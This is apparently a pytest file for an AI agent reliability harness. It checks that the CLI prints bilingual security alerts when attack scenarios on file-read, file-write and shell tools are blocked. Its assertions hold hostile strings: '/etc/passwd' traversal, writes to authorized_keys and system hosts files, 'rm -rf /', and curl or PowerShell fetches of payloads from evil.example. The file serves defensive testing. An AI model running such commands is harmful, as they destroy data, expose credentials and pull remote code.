"""Tests for CLI security alert output."""

from __future__ import annotations

from pathlib import Path

import pytest

from agent_reliability_harness.cli import main

FILE_READ_SCENARIOS_DIR = Path(__file__).resolve().parent.parent / "file_read_attack_scenarios"
FILE_WRITE_SCENARIOS_DIR = Path(__file__).resolve().parent.parent / "file_write_attack_scenarios"
SHELL_SCENARIOS_DIR = Path(__file__).resolve().parent.parent / "shell_attack_scenarios"


class TestCliSecurityAlerts:
    def test_file_read_attack_run_prints_security_alerts(
        self,
        tmp_path: Path,
        capsys: pytest.CaptureFixture[str],
    ) -> None:
        exit_code = main([
            "run",
            "--scenarios-dir",
            str(FILE_READ_SCENARIOS_DIR),
            "--output-dir",
            str(tmp_path),
            "--run-id",
            "file-read-cli",
        ])

        assert exit_code == 0
        stdout = capsys.readouterr().out

        assert "安全告警" in stdout
        assert "SECURITY ALERT" in stdout
        assert "../../../../etc/passwd" in stdout
        assert "/etc/passwd" in stdout
        assert "C:\\Windows\\System32" in stdout
        assert "argument_guard" in stdout
        assert "report.zh.md" in stdout
        assert "report.en.md" in stdout
        assert "下一步 / Next steps" in stdout

        run_dir = tmp_path / "file-read-cli"
        assert (run_dir / "report.zh.md").exists()
        assert (run_dir / "report.en.md").exists()
        assert not (tmp_path / "secret.env").exists()

    def test_file_write_attack_run_prints_security_alerts(
        self,
        tmp_path: Path,
        capsys: pytest.CaptureFixture[str],
    ) -> None:
        exit_code = main([
            "run",
            "--scenarios-dir",
            str(FILE_WRITE_SCENARIOS_DIR),
            "--output-dir",
            str(tmp_path),
            "--run-id",
            "file-write-cli",
        ])

        assert exit_code == 0
        stdout = capsys.readouterr().out

        assert "安全告警" in stdout
        assert "SECURITY ALERT" in stdout
        assert "AD-05" in stdout
        assert "AD-06" in stdout
        assert "AD-07" in stdout
        assert "AD-08" in stdout
        assert r"C:\Windows\System32\drivers\etc\hosts" in stdout
        assert "/etc/hosts" in stdout
        assert "workspace/startup.ps1" in stdout
        assert "../../authorized_keys" in stdout
        assert "write_file" in stdout
        assert "argument_guard" in stdout
        assert "report.zh.md" in stdout
        assert "report.en.md" in stdout
        assert "下一步 / Next steps" in stdout

        run_dir = tmp_path / "file-write-cli"
        report_zh = run_dir / "report.zh.md"
        report_en = run_dir / "report.en.md"
        assert report_zh.exists()
        assert report_en.exists()
        report_zh_text = report_zh.read_text(encoding="utf-8")
        report_en_text = report_en.read_text(encoding="utf-8")
        for case_id in ("AD-05", "AD-06", "AD-07", "AD-08"):
            assert case_id in report_zh_text
            assert case_id in report_en_text
        assert "写 Windows 系统路径" in report_zh_text
        assert "Windows system path write attempt" in report_en_text
        assert not (tmp_path / "authorized_keys").exists()
        assert not (tmp_path / "workspace" / "startup.ps1").exists()

    def test_shell_attack_run_prints_security_alerts(
        self,
        tmp_path: Path,
        capsys: pytest.CaptureFixture[str],
    ) -> None:
        exit_code = main([
            "run",
            "--scenarios-dir",
            str(SHELL_SCENARIOS_DIR),
            "--output-dir",
            str(tmp_path),
            "--run-id",
            "shell-cli",
        ])

        assert exit_code == 0
        stdout = capsys.readouterr().out

        assert "安全告警" in stdout
        assert "SECURITY ALERT" in stdout
        assert "AD-09" in stdout
        assert "AD-10" in stdout
        assert "AD-11" in stdout
        assert "AD-12" in stdout
        assert "rm -rf /" in stdout
        assert "cat /etc/passwd" in stdout
        assert "curl http://evil.example/payload.sh" in stdout
        assert "powershell -c iwr http://evil.example/a.ps1" in stdout
        assert "execute_shell" in stdout
        assert "argument_guard" in stdout
        assert "tool_blocked" in stdout
        assert "dangerous_delete_command" in stdout
        assert "report.zh.md" in stdout
        assert "report.en.md" in stdout
        assert "下一步 / Next steps" in stdout

        run_dir = tmp_path / "shell-cli"
        assert (run_dir / "report.zh.md").exists()
        assert (run_dir / "report.en.md").exists()
